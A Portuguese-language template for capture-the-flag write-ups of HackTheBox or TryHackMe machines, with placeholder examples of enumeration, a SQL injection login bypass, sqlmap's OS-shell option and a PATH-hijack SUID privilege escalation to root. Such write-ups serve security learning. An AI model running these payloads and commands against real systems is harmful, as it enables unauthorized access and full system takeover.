# [Nome da Máquina/Sala] - Writeup

## ℹ️ Informações

- **Plataforma:** HackTheBox / TryHackMe
- **Dificuldade:** Easy / Medium / Hard
- **Data:** DD/MM/AAAA
- **Link:** [Link para a máquina/sala]

---

## 📝 Resumo

Breve resumo da máquina. Ex: "Máquina Linux de dificuldade média que envolve exploração de uma vulnerabilidade web para obter acesso inicial e escalação de privilégios através de um binário SUID mal configurado."

---

## 🕵️‍♂️ Fase 1: Enumeração (Reconnaissance)

### 1.1. Escaneamento de Portas (Nmap)

Comando utilizado:
```bash
nmap -p- -sV -sC -oA nmap_scan <IP>
```

Resultado:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### 1.2. Enumeração Web (Porta 80)

- **Tecnologias:** (Ex: Wappalyzer mostrou Apache, PHP)
- **Diretórios e Arquivos (Gobuster/Feroxbuster):**
  ```bash
  gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
  ```
  - `/login.php`
  - `/admin/` (403 Forbidden)
  - `/uploads/`

---

## 💥 Fase 2: Acesso Inicial (Initial Access)

### 2.1. Identificação da Vulnerabilidade

(Ex: "A página `/login.php` é vulnerável a SQL Injection no campo de usuário.")

### 2.2. Exploração

Payload utilizado:
```sql
' OR 1=1--
```

Comando para obter shell reverso com `sqlmap`:
```bash
sqlmap -u "http://<IP>/login.php" --data="user=admin&pass=123" --os-shell
```

---

## 🚀 Fase 3: Escalação de Privilégios (Privilege Escalation)

### 3.1. Enumeração Interna

- **Usuário:** `www-data`
- **Comando:** `sudo -l` (verificar permissões sudo)
- **Comando:** `find / -perm -4000 2>/dev/null` (encontrar binários SUID)

### 3.2. Exploração da Vulnerabilidade de Escalação

(Ex: "O binário `/usr/local/bin/backup` tem permissão SUID e executa um comando `tar` com caminho relativo, permitindo a criação de um shell como root.")

Comandos para escalar privilégios:
```bash
# Criar um script malicioso chamado tar
echo '/bin/bash' > /tmp/tar
chmod +x /tmp/tar

# Adicionar ao PATH
export PATH=/tmp:$PATH

# Executar o binário vulnerável
/usr/local/bin/backup

# Verificar usuário
whoami
# root
```

---

## 🚩 Flags

- **User Flag:** `cat /home/user/user.txt` -> `THM{...}`
- **Root Flag:** `cat /root/root.txt` -> `THM{...}`

---

## 💡 Lições Aprendidas

1.  **Não pular enumeração:** A vulnerabilidade inicial estava em um diretório não óbvio.
2.  **Sempre verificar binários SUID:** Uma das formas mais comuns de escalação de privilégios em Linux.
3.  **Caminhos relativos são perigosos:** O uso de `tar` sem caminho absoluto no script de backup foi o erro fatal.

---

## 📚 Recursos Utilizados

- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
